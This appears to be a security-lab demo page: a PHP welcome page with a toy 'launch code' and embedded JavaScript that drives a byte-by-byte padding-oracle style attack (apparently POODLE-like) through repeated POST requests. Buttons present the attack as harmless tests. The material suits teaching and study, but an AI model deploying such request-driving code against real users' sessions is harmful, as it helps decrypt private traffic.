<!DOCTYPE html>
<html>
<head>
<title>Your Home Page</title>
<link rel="stylesheet" href="css/style.css">
</head>
<body>
<div id="profile">
<b id="welcome">Welcome : <i><?php
include('config.php');
echo($_SESSION['login_user']); ?></i></b>
<br><br>
Your nuclear weapon launch code is: 1111.
<script>
var payload = ""
var garbage = "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
var attack = 1
var i = 0
var payload_f = ""
var block_length = 8

function reset() {
    payload = payload_f
    garbage = "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
    i = 0
    console.log("reset")
}

function sendAttack() {
    if (block_length != 0) {
        var xhr = new XMLHttpRequest();
        xhr.onreadystatechange = sendAttacktHandler;
        xhr.open("POST", payload);
        xhr.send(garbage);
    } else {
        console.log('Set the blocklength: 8 or 16')
    }
}

function sendAttacktHandler() {
    if (this.readyState == this.DONE) {
        // console.log(this.status)
        if (this.status != 0) {
            console.log("FIND ONE BYTE")
            if (i < (block_length - 1)) {
                i += 1
                payload += "a"
                garbage = garbage.substr(1);
                console.log("update", payload)
            } else {
                reset()
            }
            if (attack) {
                sendAttack()
            }
        } else {
            if (attack) {
                sendAttack()
            }
        }
    }
}

function findlengthblock() {
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = sendRequestHandler2;
    xhr.open("POST", payload);
    xhr.send(garbage);
}

function sendRequestHandler2() {
    if (this.readyState == this.DONE) {
        if (this.status == 0) {
            // console.log("FIND Length", payload)
            payload_f = payload
        } else {
            payload += "a"
            if (attack) {
                findlengthblock()
            }
        }
    }
}
</script>
<br><br>
Click <button onclick="findlengthblock()">HERE</button> to send a few packets just for a test.
<br>
<br>
Click <button onclick="sendAttack()">HERE</button> to launch a test missile (no harm will be done to domestic animals).
<br>
<b id="logout"><a href="logout.php">Log Out</a></b>
</div>
</body>
</html>
